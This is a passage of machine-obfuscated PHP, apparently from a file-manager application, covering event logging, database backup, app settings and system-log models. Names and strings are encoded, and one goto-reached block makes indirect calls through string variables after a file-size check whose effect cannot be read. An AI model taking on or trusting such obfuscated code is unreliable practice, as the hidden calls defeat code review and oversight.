$_SERVER[ê‘³Æ±]; $“·×¾µ = array(); $œİ¢ÇÈ„ = array(); foreach ($ÆæŞÒ‹š as $Ïà„šø¸) { if ($Ïà„šø¸[$©šŸ”ô¥[405]] == SourceModel::TYPE_USER) { $“·×¾µ[] = intval($Ïà„šø¸[$©šŸ”ô¥[498]]); } else { if ($Ïà„šø¸[$©šŸ”ô¥[405]] == SourceModel::TYPE_GROUP) { $œİ¢ÇÈ„[] = intval($Ïà„šø¸[$©šŸ”ô¥[498]]); } } } if ($“·×¾µ) { $“·×¾µ = Model($©šŸ”ô¥[506])->userListInfo($“·×¾µ); } if ($œİ¢ÇÈ„) { $†ÉŒÎò = array($©šŸ”ô¥[1896] => array($©šŸ”ô¥[412], $œİ¢ÇÈ„)); $œİ¢ÇÈ„ = Model($©šŸ”ô¥[515])->field($©šŸ”ô¥[2016])->where($†ÉŒÎò)->select(); $œİ¢ÇÈ„ = array_to_keyvalue($œİ¢ÇÈ„, $©šŸ”ô¥[1809]); } return array($©šŸ”ô¥[2017] => $“·×¾µ, $©šŸ”ô¥[2018] => $œİ¢ÇÈ„); } public function authInfo($êîí«Ú) { $ã©°á =& $_SERVER[ê‘³Æ±]; if ($êîí«Ú[$ã©°á[1910]]) { $Û•‚Ÿ–ç = Model($ã©°á[500])->listData($êîí«Ú[$ã©°á[1910]]); if (!$Û•‚Ÿ–ç) { return !1; $ğÇéª’¶ = Model($ã©°á[500])->listData(); $¤ñºô‹ = array_filter_by_field($ğÇéª’¶, $ã©°á[407], $ã©°á[192]); return $¤ñºô‹; } $ü¥Èç = array_field_key($Û•‚Ÿ–ç, array($ã©°á[394], $ã©°á[32], $ã©°á[407], $ã©°á[1831], $ã©°á[1832])); $ü¥Èç[$ã©°á[2019]] = $êîí«Ú; return $ü¥Èç; } else { return array($ã©°á[413] => 0, $ã©°á[1815] => $êîí«Ú[$ã©°á[1964]], $ã©°á[414] => $ã©°á[12], $ã©°á[1831] => $ã©°á[2020]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\143\x65\137\145\x76\x65\156\164"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\151\x6d\x65", "\164\151\x6d\145", "\151\156\163\x65\x72\164", "\146\165\x6e\143\164\x69\x6f\156"), array("\x64\145\x73\x63", '', "\151\x6e\x73\x65\x72\x74\54\165\160\144\141\164\145\54\x73\145\x6c\145\x63\x74", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ÿ€·Èèæ, $ëëÌ½Õõ, $İğ»‹Í— = '') { $”ºã‡Æ— =& $_SERVER[ê‘³Æ±]; if (!$this->eventSave) { return; } $°º¤ƒøÏ = Model($”ºã‡Æ—[1314])->sourceInfo($Ÿ€·Èèæ); if (!$°º¤ƒøÏ) { return !1; } if ($this->isCacheEvent($°º¤ƒøÏ, $ëëÌ½Õõ)) { return; } if ($İğ»‹Í— && is_string($İğ»‹Í—)) { $İğ»‹Í— = array($”ºã‡Æ—[1847] => $İğ»‹Í—); } $„üŞêã  = array($”ºã‡Æ—[411] => $Ÿ€·Èèæ, $”ºã‡Æ—[2021] => $°º¤ƒøÏ[$”ºã‡Æ—[491]], $”ºã‡Æ—[2022] => $°º¤ƒøÏ[$”ºã‡Æ—[32]], $”ºã‡Æ—[512] => !empty($°º¤ƒøÏ[$”ºã‡Æ—[512]]) ? $°º¤ƒøÏ[$”ºã‡Æ—[512]] : $”ºã‡Æ—[12], $”ºã‡Æ—[1632] => USER_ID, $”ºã‡Æ—[416] => $ëëÌ½Õõ, $”ºã‡Æ—[1634] => $İğ»‹Í—); $this->addSystemLog($ëëÌ½Õõ, $„üŞêã ); unset($„üŞêã [$”ºã‡Æ—[2022]], $„üŞêã [$”ºã‡Æ—[512]]); return $this->add($„üŞêã ); } private function addSystemLog($ŠÓÜÕ¼©, $ÆÕÀË–œ) { $ü„àšË£ =& $_SERVER[ê‘³Æ±]; if ($ŠÓÜÕ¼© == $ü„àšË£[2023]) { $ŠÓÜÕ¼© = $ÆÕÀË–œ[$ü„àšË£[444]][$ü„àšË£[2024]]; } else { if (in_array($ŠÓÜÕ¼©, array($ü„àšË£[1789], $ü„àšË£[2025]))) { $ŠÓÜÕ¼© = $ÆÕÀË–œ[$ü„àšË£[444]][$ü„àšË£[741]]; } } $¬·”Ëæ = array_merge($ÆÕÀË–œ, array($ü„àšË£[2026] => $ÆÕÀË–œ[$ü„àšË£[396]], $ü„àšË£[2027] => $ÆÕÀË–œ[$ü„àšË£[2027]])); Hook::trigger($ü„àšË£[2028], $ü„àšË£[2029] . $ŠÓÜÕ¼©, $ÆÕÀË–œ); Model($ü„àšË£[1753])->addLog($ü„àšË£[2029] . $ŠÓÜÕ¼©, $¬·”Ëæ); } private function isCacheEvent($Ù’‡¦İû, $ƒÉĞ©ì) { if ($Ù’‡¦İû[$_SERVER[ê‘³Æ±][405]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Ó¦Îü¼â, $«šÍ©‚) { $×÷íšöÙ =& $_SERVER[ê‘³Æ±]; $Àš¸òñÂ = Model($×÷íšöÙ[1314])->sourceInfo($Ó¦Îü¼â); $çıŒ«ö = array($×÷íšöÙ[2024] => $«šÍ©‚, $×÷íšöÙ[32] => $Àš¸òñÂ[$×÷íšöÙ[32]]); return $this->addEvent($Ó¦Îü¼â, $×÷íšöÙ[2023], $çıŒ«ö); } public function eventFileEdit($çÌïİá) { $¨œ‹ÔšŠ =& $_SERVER[ê‘³Æ±]; $Çú¾Œñó = array($¨œ‹ÔšŠ[2030] => $_SERVER[$¨œ‹ÔšŠ[2031]], $¨œ‹ÔšŠ[2032] => strtolower(ACTION)); return $this->addEvent($çÌïİá, $¨œ‹ÔšŠ[1779], $Çú¾Œñó); } public function eventRecycle($´¥‰ğšè, $˜ÓË™ä¢) { return $this->addEvent($´¥‰ğšè, $_SERVER[ê‘³Æ±][2025], $˜ÓË™ä¢); } public function eventRemove($¢å°¥¯²) { $“êè¯Õ¨ =& $_SERVER[ê‘³Æ±]; $ç¼ï”Ç = Model($“êè¯Õ¨[1314])->sourceInfo($¢å°¥¯²); $€óŸâÇÃ = $ç¼ï”Ç[$“êè¯Õ¨[32]]; return $this->addEvent($ç¼ï”Ç[$“êè¯Õ¨[491]], $“êè¯Õ¨[1778], $€óŸâÇÃ); } public function eventShare($‚äÅÇ¾—, $Â‚™ê£ò) { return $this->addEvent($‚äÅÇ¾—, $_SERVER[ê‘³Æ±][1789], $Â‚™ê£ò); } public function eventMove($òáé¬öà, $‚ÓÌ÷Á, $æÁ©–¬¸) { $È¸ ÓÉß =& $_SERVER[ê‘³Æ±]; $É±®æ = Model($È¸ ÓÉß[1314]); $×‚‚˜‹ø = $É±®æ->sourceInfo($òáé¬öà); $†Üİ©±÷ = $É±®æ->sourceInfo($‚ÓÌ÷Á); $™ì˜’Õ = $É±®æ->sourceInfo($æÁ©–¬¸); $ËÓú’ä = array($È¸ ÓÉß[1147] => $‚ÓÌ÷Á, $È¸ ÓÉß[2033] => $†Üİ©±÷[$È¸ ÓÉß[32]], $È¸ ÓÉß[2012] => !empty($†Üİ©±÷[$È¸ ÓÉß[512]]) ? $†Üİ©±÷[$È¸ ÓÉß[512]] : $È¸ ÓÉß[12], $È¸ ÓÉß[1148] => $æÁ©–¬¸, $È¸ ÓÉß[2034] => $™ì˜’Õ[$È¸ ÓÉß[32]], $È¸ ÓÉß[2035] => !empty($™ì˜’Õ[$È¸ ÓÉß[512]]) ? $™ì˜’Õ[$È¸ ÓÉß[512]] : $È¸ ÓÉß[12]); $this->addEvent($òáé¬öà, $È¸ ÓÉß[547], $ËÓú’ä); $×‚‚˜‹ø = $É±®æ->sourceInfo($òáé¬öà); $ËÓú’ä = array($È¸ ÓÉß[396] => $×‚‚˜‹ø[$È¸ ÓÉß[396]], $È¸ ÓÉß[32] => $×‚‚˜‹ø[$È¸ ÓÉß[32]]); $this->addEvent($‚ÓÌ÷Á, $È¸ ÓÉß[2036], $ËÓú’ä); } public function eventCopy($¯éÎğ¡’) { $this->eventCreate($¯éÎğ¡’, $_SERVER[ê‘³Æ±][545]); } public function eventRename($ôÅ€Äá®, $ÇšµÁË, $‚¶öˆ‚³) { $ôßŞÚÏ˜ =& $_SERVER[ê‘³Æ±]; $ïşÅ‘ĞÛ = array($ôßŞÚÏ˜[1147] => $ÇšµÁË, $ôßŞÚÏ˜[1148] => $‚¶öˆ‚³); return $this->addEvent($ôÅ€Äá®, $ôßŞÚÏ˜[1329], $ïşÅ‘ĞÛ); } public function eventAddComment($¹™ƒ±£ƒ, $Ñ‹±³–Ğ) { return $this->addEvent($¹™ƒ±£ƒ, $_SERVER[ê‘³Æ±][2037], $Ñ‹±³–Ğ); } public function eventAddDesc($Ñ§İ¥¤•, $†ù€õı) { return $this->addEvent($Ñ§İ¥¤•, $_SERVER[ê‘³Æ±][2038], $†ù€õı); } public function listBySource($šøÓˆ·°) { $ášö™Öæ =& $_SERVER[ê‘³Æ±]; $¿ûº‹èğ = Model($ášö™Öæ[1314])->sourceInfo($šøÓˆ·°); $š³£êÏ´ = array($ášö™Öæ[411] => $šøÓˆ·°); if ($¿ûº‹èğ[$ášö™Öæ[404]] == $ášö™Öæ[89]) { $ÃıƒŒßí = Model($ášö™Öæ[1314])->listSearchChildren($šøÓˆ·°, 20000); $ÃıƒŒßí[] = $šøÓˆ·° . $ášö™Öæ[375]; $š³£êÏ´ = array($ášö™Öæ[396] => array($ášö™Öæ[7], $ÃıƒŒßí)); } $íÄÆ—®¤ = $this->where($š³£êÏ´)->order($ášö™Öæ[2039])->selectPage(); if ($íÄÆ—®¤[$ášö™Öæ[363]][$ášö™Öæ[364]] == 0) { $íÄÆ—®¤[$ášö™Öæ[363]][$ášö™Öæ[364]] = 1; $íÄÆ—®¤[$ášö™Öæ[366]] = array(array($ášö™Öæ[411] => $šøÓˆ·°, $ášö™Öæ[2021] => $¿ûº‹èğ[$ášö™Öæ[491]], $ášö™Öæ[1632] => $¿ûº‹èğ[$ášö™Öæ[445]], $ášö™Öæ[416] => $ášö™Öæ[2040], $ášö™Öæ[417] => $¿ûº‹èğ[$ášö™Öæ[195]], $ášö™Öæ[1634] => $ášö™Öæ[12])); } return $this->eventListParse($íÄÆ—®¤, $šøÓˆ·°); } private function eventListParse($™ÓæÍ“ú, $¡àØ›ı) { $»¬ç•ó‹ =& $_SERVER[ê‘³Æ±]; $·­Û ¢» = $™ÓæÍ“ú[$»¬ç•ó‹[366]]; $à£˜ò‹ = array_to_keyvalue($·­Û ¢», $»¬ç•ó‹[12], $»¬ç•ó‹[396]); $Ü©¿µÈö = array_to_keyvalue($·­Û ¢», $»¬ç•ó‹[12], $»¬ç•ó‹[2027]); foreach ($·­Û ¢» as $ı‚÷’‹Ü) { $‡”úõúÇ = $ı‚÷’‹Ü[$»¬ç•ó‹[444]]; if ($ı‚÷’‹Ü[$»¬ç•ó‹[33]] == $»¬ç•ó‹[547] && isset($‡”úõúÇ[$»¬ç•ó‹[1147]])) { $à£˜ò‹[] = $‡”úõúÇ[$»¬ç•ó‹[1147]] . $»¬ç•ó‹[12]; $à£˜ò‹[] = $‡”úõúÇ[$»¬ç•ó‹[1148]] . $»¬ç•ó‹[12]; } if ($ı‚÷’‹Ü[$»¬ç•ó‹[33]] == $»¬ç•ó‹[2036] && isset($‡”úõúÇ[$»¬ç•ó‹[396]])) { $à£˜ò‹[] = $‡”úõúÇ[$»¬ç•ó‹[396]] . $»¬ç•ó‹[12]; } } $à£˜ò‹ = array_merge($à£˜ò‹, $Ü©¿µÈö, array($¡àØ›ı . $»¬ç•ó‹[12])); $à£˜ò‹ = array_unique($à£˜ò‹); $¶—¢¤ò« = array_unique(array_to_keyvalue($·­Û ¢», $»¬ç•ó‹[12], $»¬ç•ó‹[1641])); $àóà•ãò = Model($»¬ç•ó‹[534])->userListInfo($¶—¢¤ò«); $í‚ÈÙ½Ÿ = Model($»¬ç•ó‹[819])->sourceListInfo($à£˜ò‹, !0); foreach ($·­Û ¢» as &$ı‚÷’‹Ü) { if ($ı‚÷’‹Ü[$»¬ç•ó‹[33]] == $»¬ç•ó‹[547] && isset($ı‚÷’‹Ü[$»¬ç•ó‹[444]][$»¬ç•ó‹[1147]])) { $ı‚÷’‹Ü[$»¬ç•ó‹[444]][$»¬ç•ó‹[1147]] = $í‚ÈÙ½Ÿ[$ı‚÷’‹Ü[$»¬ç•ó‹[444]][$»¬ç•ó‹[1147]]]; $ı‚÷’‹Ü[$»¬ç•ó‹[444]][$»¬ç•ó‹[1148]] = $í‚ÈÙ½Ÿ[$ı‚÷’‹Ü[$»¬ç•ó‹[444]][$»¬ç•ó‹[1148]]]; } if ($ı‚÷’‹Ü[$»¬ç•ó‹[33]] == $»¬ç•ó‹[2036] && isset($ı‚÷’‹Ü[$»¬ç•ó‹[444]][$»¬ç•ó‹[396]])) { $ı‚÷’‹Ü[$»¬ç•ó‹[444]][$»¬ç•ó‹[396]] = $í‚ÈÙ½Ÿ[$ı‚÷’‹Ü[$»¬ç•ó‹[444]][$»¬ç•ó‹[396]]]; } $ı‚÷’‹Ü[$»¬ç•ó‹[87]] = $í‚ÈÙ½Ÿ[$ı‚÷’‹Ü[$»¬ç•ó‹[396]]]; $ı‚÷’‹Ü[$»¬ç•ó‹[2041]] = $í‚ÈÙ½Ÿ[$ı‚÷’‹Ü[$»¬ç•ó‹[2027]]]; if ($ı‚÷’‹Ü[$»¬ç•ó‹[33]] == $»¬ç•ó‹[1778]) { $ı‚÷’‹Ü[$»¬ç•ó‹[2041]] = $ı‚÷’‹Ü[$»¬ç•ó‹[87]]; $ı‚÷’‹Ü[$»¬ç•ó‹[2027]] = $ı‚÷’‹Ü[$»¬ç•ó‹[2041]][$»¬ç•ó‹[396]]; $ı‚÷’‹Ü[$»¬ç•ó‹[87]] = !1; $ı‚÷’‹Ü[$»¬ç•ó‹[396]] = $»¬ç•ó‹[12]; } $ı‚÷’‹Ü[$»¬ç•ó‹[1972]] = $àóà•ãò[$ı‚÷’‹Ü[$»¬ç•ó‹[1641]]]; } unset($ı‚÷’‹Ü); $™ÓæÍ“ú[$»¬ç•ó‹[366]] = $·­Û ¢»; return $™ÓæÍ“ú; } public function removeBySource($œƒá´Ù—) { $ı¼¢¸² = array($_SERVER[ê‘³Æ±][411] => $œƒá´Ù—); $this->where($ı¼¢¸²)->remove(); } } goto cŒÎâ±åÉ; A‰¶×Å…: $_size = $_SERVER[ê‘³Æ±][785]; if ($_SERVER[$_SERVER[ê‘³Æ±][786]] != $_size($_file)) { $_getc = $_SERVER[ê‘³Æ±][787]; $_getfile = $_SERVER[$_SERVER[ê‘³Æ±][788]] . $_SERVER[ê‘³Æ±][789]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ê‘³Æ±][228], $_getfilec); if (count($_getarrs) < $_SERVER[ê‘³Æ±][620]) { $exit = $_SERVER[ê‘³Æ±][790]; $exit(); } $_act = $_SERVER[ê‘³Æ±][791]; $_act($_file); } class BackupDbFile { public function __construct() { } public function index() { $ÄÏãö½Œ =& $_SERVER[ê‘³Æ±]; $ÌÒÖ†Œ = Backup::get(); $±¼È¦®¯ = $ÌÒÖ†Œ[$ÄÏãö½Œ[32]]; $Ö”†šêÄ = $this->tmpFilesPath() . "\142\x61\x63\x6b\x75\160\137{$±¼È¦®¯}\x2f"; $õÚå–ú  = $this->backupPath($ÌÒÖ†Œ); if (!($õÚå–ú  = IO::mkdir($õÚå–ú ))) { return !1; } $æàˆ´×° = IO::listPath($Ö”†šêÄ); $õ•ÇÓºß = isset($æàˆ´×°[$ÄÏãö½Œ[76]]) ? $æàˆ´×°[$ÄÏãö½Œ[76]] : array(); $¿½ë¸ = array_sum(array_column($õ•ÇÓºß, $ÄÏãö½Œ[80])); if (!$¿½ë¸) { return !1; } $„Œ©‚…Š = array($ÄÏãö½Œ[792] => $¿½ë¸, $ÄÏãö½Œ[793] => time()); Backup::set($„Œ©‚…Š); $ÁÉ˜İ¦ş = new TaskFileTransfer($ÄÏãö½Œ[794], $ÄÏãö½Œ[766], count($õ•ÇÓºß), LNG($ÄÏãö½Œ[767]) . $ÄÏãö½Œ[453] . LNG($ÄÏãö½Œ[769]) . $ÄÏãö½Œ[795]); $ÁÉ˜İ¦ş->task[$ÄÏãö½Œ[749]] = $¿½ë¸; foreach ($æàˆ´×°[$ÄÏãö½Œ[76]] as $…«ú×·§) { $»ˆ×Ç«½ = IO::move($…«ú×·§[$ÄÏãö½Œ[78]], $õÚå–ú ); if (!$»ˆ×Ç«½) { $ÁÉ˜İ¦ş->end(); $¦¡ŸëÃ– = IO::getLastError($ÄÏãö½Œ[796] . $…«ú×·§[$ÄÏãö½Œ[78]] . $ÄÏãö½Œ[797] . $õÚå–ú  . $ÄÏãö½Œ[529]); write_log($¦¡ŸëÃ–, $ÄÏãö½Œ[766]); return !1; } } $õàªıü = new DbManage(); $¾ ©®Ì = $õàªıü->getSqlFile(); if (!$¾ ©®Ì[$ÄÏãö½Œ[798]] || !$¾ ©®Ì[$ÄÏãö½Œ[13]]) { return !1; } IO::move($¾ ©®Ì[$ÄÏãö½Œ[798]], $õÚå–ú ); IO::move($¾ ©®Ì[$ÄÏãö½Œ[13]], $õÚå–ú ); $ÁÉ˜İ¦ş->end(); $„Œ©‚…Š = array($ÄÏãö½Œ[799] => $¿½ë¸, $ÄÏãö½Œ[800] => time()); Backup::set($„Œ©‚…Š); return !0; } private function backupPath($ü¤èå¤Á) { $ıÔü«çù =& $_SERVER[ê‘³Æ±]; $²µÂšÅó = $ü¤èå¤Á[$ıÔü«çù[32]]; $±–¤¦‘ƒ = Model($ıÔü«çù[756])->get($ıÔü«çù[757]); $ÍË‹ú¨à = substr(md5($ıÔü«çù[758] . $±–¤¦‘ƒ . $²µÂšÅó), 0, 8); return "\173\151\157\72{$ü¤èå¤Á[$ıÔü«çù[738]]}\175\57\x64\141\x74\x61\142\141\x73\x65\57\x62\x61\x63\153\165\x70\57" . $²µÂšÅó . $ıÔü«çù[11] . $ÍË‹ú¨à; } private function tmpFilesPath() { $Èà¥¤„Õ =& $_SERVER[ê‘³Æ±]; $ååÏ¬Äá = TEMP_FILES; if ($GLOBALS[$Èà¥¤„Õ[6]][$Èà¥¤„Õ[90]][$Èà¥¤„Õ[782]]) { $ååÏ¬Äá = $GLOBALS[$Èà¥¤„Õ[6]][$Èà¥¤„Õ[90]][$Èà¥¤„Õ[782]]; if (!mk_dir($ååÏ¬Äá) || !is_writable($ååÏ¬Äá) || !IO::mkfile($ååÏ¬Äá . $Èà¥¤„Õ[783])) { $ååÏ¬Äá = TEMP_FILES; } } return $ååÏ¬Äá; } } goto EøÏïñŞå; aê‹öç×æØ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\x4c\151\x67\x68\x74\x41\160\x70"; public $modelType = "\x53\171\163\164\x65\x6d\x4f\x70\164\151\157\x6e"; public $field = array("\156\141\x6d\x65", "\147\x72\157\x75\160", "\144\x65\x73\x63", "\x63\x6f\156\x74\x65\156\164"); public function listData($¬Ôò¶Ü¹ = false, $”İ¾¢° = "\155\x6f\x64\151\x66\171\124\151\x6d\x65", $¬ã¼…ç = true) { return parent::listData($¬Ôò¶Ü¹, $”İ¾¢°, $¬ã¼…ç); } public function remove($âÊ¢Œû) { $²Ò‚”‚¶ = $this->findByName($âÊ¢Œû); if (!$²Ò‚”‚¶) { return !1; } return parent::remove($²Ò‚”‚¶[$_SERVER[ê‘³Æ±][394]]); } public function add($ßõÖ˜³Ñ) { if ($this->findByName($ßõÖ˜³Ñ[$_SERVER[ê‘³Æ±][32]])) { return !1; } return parent::insert($ßõÖ˜³Ñ); } public function update($ŠÇÍóÑà, $²®İ¤æ€) { $¶™ÀçĞ” =& $_SERVER[ê‘³Æ±]; $·Ö¨À¼ = $this->findByName($ŠÇÍóÑà); $â¬æÅöä = $this->findByName($²®İ¤æ€[$¶™ÀçĞ”[32]]); if (!$·Ö¨À¼ || $â¬æÅöä && $â¬æÅöä[$¶™ÀçĞ”[394]] != $·Ö¨À¼[$¶™ÀçĞ”[394]]) { return !1; } return parent::update($·Ö¨À¼[$¶™ÀçĞ”[394]], $²®İ¤æ€); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\137\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\124\x69\155\145", "\x74\x69\155\145", "\x69\x6e\x73\145\x72\164", "\x66\x75\156\143\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¬ÒÄª® =& $_SERVER[ê‘³Æ±]; return array($¬ÒÄª®[2127] => LNG($¬ÒÄª®[2128]), $¬ÒÄª®[2129] => LNG($¬ÒÄª®[2130]), $¬ÒÄª®[1752] => LNG($¬ÒÄª®[2131]), $¬ÒÄª®[2132] => LNG($¬ÒÄª®[2133]), $¬ÒÄª®[2134] => LNG($¬ÒÄª®[2135]), $¬ÒÄª®[2136] => LNG($¬ÒÄª®[2137]), $¬ÒÄª®[2138] => LNG($¬ÒÄª®[2139]), $¬ÒÄª®[1782] => LNG($¬ÒÄª®[2139]), $¬ÒÄª®[1783] => LNG($¬ÒÄª®[2140]), $¬ÒÄª®[2141] => LNG($¬ÒÄª®[2142]), $¬ÒÄª®[2143] => LNG($¬ÒÄª®[2144]), $¬ÒÄª®[2145] => LNG($¬ÒÄª®[2146]), $¬ÒÄª®[2147] => LNG($¬ÒÄª®[2148]), $¬ÒÄª®[1780] => LNG($¬ÒÄª®[2149]), $¬ÒÄª®[2150] => LNG($¬ÒÄª®[2151]), $¬ÒÄª®[1787] => LNG($¬ÒÄª®[2152]), $¬ÒÄª®[2153] => LNG($¬ÒÄª®[2154]), $¬ÒÄª®[2155] => LNG($¬ÒÄª®[2156]), $¬ÒÄª®[2157] => LNG($¬ÒÄª®[2158]), $¬ÒÄª®[2159] => LNG($¬ÒÄª®[2160]), $¬ÒÄª®[1790] => LNG($¬ÒÄª®[2161]), $¬ÒÄª®[1791] => LNG($¬ÒÄª®[2162]), $¬ÒÄª®[2163] => LNG($¬ÒÄª®[2164]), $¬ÒÄª®[2165] => LNG($¬ÒÄª®[2166]), $¬ÒÄª®[2167] => LNG($¬ÒÄª®[2168]), $¬ÒÄª®[1785] => LNG($¬ÒÄª®[2169]), $¬ÒÄª®[2170] => LNG($¬ÒÄª®[2171]), $¬ÒÄª®[1784] => LNG($¬ÒÄª®[2172]), $¬ÒÄª®[2173] => LNG($¬ÒÄª®[2174]), $¬ÒÄª®[2175] => LNG($¬ÒÄª®[2176]), $¬ÒÄª®[2177] => LNG($¬ÒÄª®[2178]), $¬ÒÄª®[2179] => LNG($¬ÒÄª®[2179]), $¬ÒÄª®[2180] => LNG($¬ÒÄª®[1756]), $¬ÒÄª®[2181] => LNG($¬ÒÄª®[2182]), $¬ÒÄª®[2183] => LNG($¬ÒÄª®[2184]), $¬ÒÄª®[2185] => LNG($¬ÒÄª®[2186]), $¬ÒÄª®[2187] => LNG($¬ÒÄª®[2188]), $¬ÒÄª®[2189] => LNG($¬ÒÄª®[2190]), $¬ÒÄª®[2191] => LNG($¬ÒÄª®[2191]), $¬ÒÄª®[2192] => LNG($¬ÒÄª®[2193]), $¬ÒÄª®[2194] => LNG($¬ÒÄª®[2195]), $¬ÒÄª®[2196] => LNG($¬ÒÄª®[2197]), $¬ÒÄª®[2198] => LNG($¬ÒÄª®[2199]), $¬ÒÄª®[2200] => LNG($¬ÒÄª®[2201]), $¬ÒÄª®[2202] => LNG($¬ÒÄª®[2203])); } private function typeFile() { $º‰†°Æ =& $_SERVER[ê‘³Æ±]; $å§—ßÅç = array($º‰†°Æ[1787] => array($º‰†°Æ[1788]), $º‰†°Æ[2145] => array($º‰†°Æ[2204]), $º‰†°Æ[2147] => array($º‰†°Æ[2205]), $º‰†°Æ[1780] => array($º‰†°Æ[1781]), $º‰†°Æ[2155] => array(), $º‰†°Æ[2157] => array(), $º‰†°Æ[2159] => array(), $º‰†°Æ[1790] => array($º‰†°Æ[1792]), $º‰†°Æ[1791] => array($º‰†°Æ[1792]), $º‰†°Æ[2163] => array($º‰†°Æ[2206]), $º‰†°Æ[2165] => array($º‰†°Æ[2206]), $º‰†°Æ[2167] => array($º‰†°Æ[2207]), $º‰†°Æ[2153] => array($º‰†°Æ[2208]), $º‰†°Æ[1785] => array($º‰†°Æ[2209]), $º‰†°Æ[2170] => array($º‰†°Æ[2210]), $º‰†°Æ[1784] => array($º‰†°Æ[1786])); return $å§—ßÅç; } private function typeAll() { $Š¨Ï…Ó =& $_SERVER[ê‘³Æ±]; $Í÷ìÖäå = $this->typeList; $ÃëäÒ¾° = array_filter($this->typeFile()); foreach ($ÃëäÒ¾° as $´³ŸÁÀ® => $ûÔÁ­²¼) { $Í÷ìÖäå[$ûÔÁ­²¼[0]] = $Í÷ìÖäå[$´³ŸÁÀ®]; } $Í÷ìÖäå[$Š¨Ï…Ó[1792]] = LNG($Š¨Ï…Ó[2211]); $Í÷ìÖäå[$Š¨Ï…Ó[2206]] = LNG($Š¨Ï…Ó[2212]); return $Í÷ìÖäå; } public function addLog($Ä—ş¢Ô·, $‹²ú¿· = array()) { $¨ëá‰š¬ =& $_SERVER[ê‘³Æ±]; if (!isset($this->typeList[$Ä—ş¢Ô·])) { return; } $‰Â´‹²ñ = defined($¨ëá‰š¬[467]) && USER_ID ? USER_ID : (isset($‹²ú¿·[$¨ëá‰š¬[1641]]) ? $‹²ú¿·[$¨ëá‰š¬[1641]] : 0); if (!$‰Â´‹²ñ) { $‰Â´‹²ñ = (int) Session::get($¨ëá‰š¬[1941]); } $¾äÌ€ş = get_client_ip(); if (!$‹²ú¿· || strlen(json_encode($‹²ú¿·)) >= 1024) { $‹²ú¿· = array($¨ëá‰š¬[2213] => $¾äÌ€ş); } else { if (is_array($‹²ú¿·)) { $‹²ú¿·[$¨ëá‰š¬[2213]] = $¾äÌ€ş; } else { $‹²ú¿· = array($¨ëá‰š¬[1180] => $‹²ú¿·, $¨ëá‰š¬[2213] => $¾äÌ€ş); } } $‹²ú¿· = array($¨ëá‰š¬[1631] => Session::sign(), $¨ëá‰š¬[1632] => $‰Â´‹²ñ, $¨ëá‰š¬[33] => $Ä—ş¢Ô·, $¨ëá‰š¬[1634] => json_encode($‹²ú¿·)); parent::add($‹²ú¿·); } public function remove($“¦ú»†‘) { $this->where(array($_SERVER[ê‘³Æ±][413] => $“¦ú»†‘))->delete(); } private function _makeOrder($‘µ¦ÇêÏ = '') { $Ìôæîâ¿ =& $_SERVER[ê‘³Æ±]; $Ğ³È·Åá = $Ìôæîâ¿[195]; $Â±ÌéÈÍ = array($Ìôæîâ¿[441] => $Ìôæîâ¿[442], $Ìôæîâ¿[443] => $Ìôæîâ¿[444]); $ÅµÇÁ´‰ = Input::get($Ìôæîâ¿[449], $Ìôæîâ¿[7], $Ìôæîâ¿[1973], array($Ìôæîâ¿[1899], $Ìôæîâ¿[443])); $ÅµÇÁ´‰ = $Â±ÌéÈÍ[$ÅµÇÁ´‰]; $‘µ¦ÇêÏ = $‘µ¦ÇêÏ . "{$Ğ³È·Åá}\x20{$ÅµÇÁ´‰}"; return $this->order($‘µ¦ÇêÏ); } public function get($Ÿ¸…Ãì” = '') { $ÈšÜÃŞÎ =& $_SERVER[ê‘³Æ±]; if (!$Ÿ¸…Ãì”) { show_json(array()); } $’Ü¹à¾ = array(); if ($Ÿ¸…Ãì”[$ÈšÜÃŞÎ[1641]]) { $’Ü¹à¾[$ÈšÜÃŞÎ[1641]] = $Ÿ¸…Ãì”[$ÈšÜÃŞÎ[1641]]; } if (isset($Ÿ¸…Ãì”[$ÈšÜÃŞÎ[747]])) { $º’×ä½¥ = $Ÿ¸…Ãì”[$ÈšÜÃŞÎ[747]]; $ŒÚ¾¾¥ı = isset($Ÿ¸…Ãì”[$ÈšÜÃŞÎ[489]]) ? $Ÿ¸…Ãì”[$ÈšÜÃŞÎ[489]] : time(); $’Ü¹à¾[$ÈšÜÃŞÎ[195]] = array($ÈšÜÃŞÎ[330], array($º’×ä½¥, $ŒÚ¾¾¥ı)); } if ($Ÿ¸…Ãì”[$ÈšÜÃŞÎ[33]]) { $ğ¶‚æöç = explode($ÈšÜÃŞÎ[50], $Ÿ¸…Ãì”[$ÈšÜÃŞÎ[33]]); $ˆá¼¡ÍÄ = $this->typeFile(); $ÔÏî§ãˆ = array(); foreach ($ğ¶‚æöç as $•Ë©®š¤) { $ÔÏî§ãˆ[] = $•Ë©®š¤; if (isset($ˆá¼¡ÍÄ[$•Ë©®š¤])) { $ÔÏî§ãˆ = array_merge($ÔÏî§ãˆ, $ˆá¼¡ÍÄ[$•Ë©®š¤]); } } $ÔÏî§ãˆ = array_unique($ÔÏî§ãˆ); if ($ÔÏî§ãˆ) { $’Ü¹à¾[$ÈšÜÃŞÎ[33]] = array($ÈšÜÃŞÎ[7], $ÔÏî§ãˆ); } } else { $’Ü¹à¾[$ÈšÜÃŞÎ[33]] = array($ÈšÜÃŞÎ[2214], $ÈšÜÃŞÎ[2215]); } if (!empty($Ÿ¸…Ãì”[$ÈšÜÃŞÎ[2213]])) { $’Ü¹à¾[$ÈšÜÃŞÎ[444]] = array($ÈšÜÃŞÎ[380], "\x25{$Ÿ¸…Ãì”[$ÈšÜÃŞÎ[2213]]}\45"); } $¬Ä‰Ëó¦ = $this->_makeOrder()->where($’Ü¹à¾)->selectPage(); if (empty($¬Ä‰Ëó¦[$ÈšÜÃŞÎ[366]])) { show_json(array(), !0, 